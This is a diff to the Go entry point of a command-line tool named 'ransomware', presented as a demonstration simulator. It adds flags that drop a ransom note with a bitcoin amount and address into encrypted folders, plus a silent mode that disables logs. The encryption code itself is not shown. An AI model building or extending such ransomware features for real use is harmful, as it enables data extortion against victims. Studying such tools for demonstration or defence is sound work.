@@ -7,17 +7,19 @@ import (
 
 	"github.com/common-nighthawk/go-figure"
 	"github.com/marmos91/ransomware/cli"
+	"github.com/marmos91/ransomware/utils"
 	urfavecli "github.com/urfave/cli/v2"
 )
 
 const APP_NAME = "ransomware"
 const APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
 const APP_VERSION = "v1.0.0"
-const BITCOIN_ADDRESS = "BITCOIN_ADDRESS"
 
-func SplashScreen(silent bool) func(*urfavecli.Context) error {
+func Init() func(*urfavecli.Context) error {
 	return func(ctx *urfavecli.Context) error {
-		if !silent {
+		if ctx.Bool("silent") {
+			utils.DisableLogs()
+		} else {
 			figure.NewFigure(APP_NAME, "graffiti", true).Print()
 		}
 
@@ -26,8 +28,6 @@ func SplashScreen(silent bool) func(*urfavecli.Context) error {
 }
 
 func main() {
-	var silent bool
-
 	app := &urfavecli.App{
 		Name:     APP_NAME,
 		Usage:    APP_DESCRIPTION,
@@ -41,10 +41,9 @@ func main() {
 		},
 		Flags: []urfavecli.Flag{
 			&urfavecli.BoolFlag{
-				Name:        "silent",
-				Usage:       "Runs the tool in silent mode (no logs)",
-				Destination: &silent,
-				Value:       false,
+				Name:  "silent",
+				Usage: "Runs the tool in silent mode (no logs)",
+				Value: false,
 			},
 		},
 		Commands: []*urfavecli.Command{
@@ -52,7 +51,7 @@ func main() {
 				Name:    "create-keys",
 				Aliases: []string{"c"},
 				Usage:   "Generates a new random keypair and saves it to a file",
-				Before:  SplashScreen(silent),
+				Before:  Init(),
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:    "path",
@@ -67,6 +66,7 @@ func main() {
 				Name:    "encrypt",
 				Usage:   "Encrypts a directory",
 				Aliases: []string{"e"},
+				Before:  Init(),
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:     "path",
@@ -104,14 +104,38 @@ func main() {
 						Usage: "defines the suffix to add to encrypted files",
 						Value: ".enc",
 					},
+					&urfavecli.BoolFlag{
+						Name:  "addRansom",
+						Usage: "if set to true add a ransom note to every encrypted folder",
+						Value: false,
+					},
+					&urfavecli.StringFlag{
+						Name:  "ransomTemplatePath",
+						Usage: "defines where to find the template to use for the ransom note",
+					},
+					&urfavecli.StringFlag{
+						Name:  "ransomFileName",
+						Usage: "defines the name of the ransom file name",
+						Value: "IMPORTANT.txt",
+					},
+					&urfavecli.Float64Flag{
+						Name:  "bitcoinCount",
+						Usage: "how many bitcoins to ask as ransom",
+						Value: 0,
+					},
+					&urfavecli.StringFlag{
+						Name:  "bitcoinAddress",
+						Usage: "the bitcoin address to use",
+						Value: "<bitcoin address>",
+					},
 				},
-				Before: SplashScreen(silent),
 				Action: cli.Encrypt,
 			},
 			{
 				Name:    "decrypt",
 				Usage:   "Decrypts a directory",
 				Aliases: []string{"d"},
+				Before:  Init(),
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:     "path",
@@ -134,8 +158,12 @@ func main() {
 						Usage: "defines the suffix to add to encrypted files",
 						Value: ".enc",
 					},
+					&urfavecli.StringFlag{
+						Name:  "ransomFileName",
+						Usage: "defines the name of the ransom file name",
+						Value: "IMPORTANT.txt",
+					},
 				},
-				Before: SplashScreen(silent),
 				Action: cli.Decrypt,
 			},
 		},
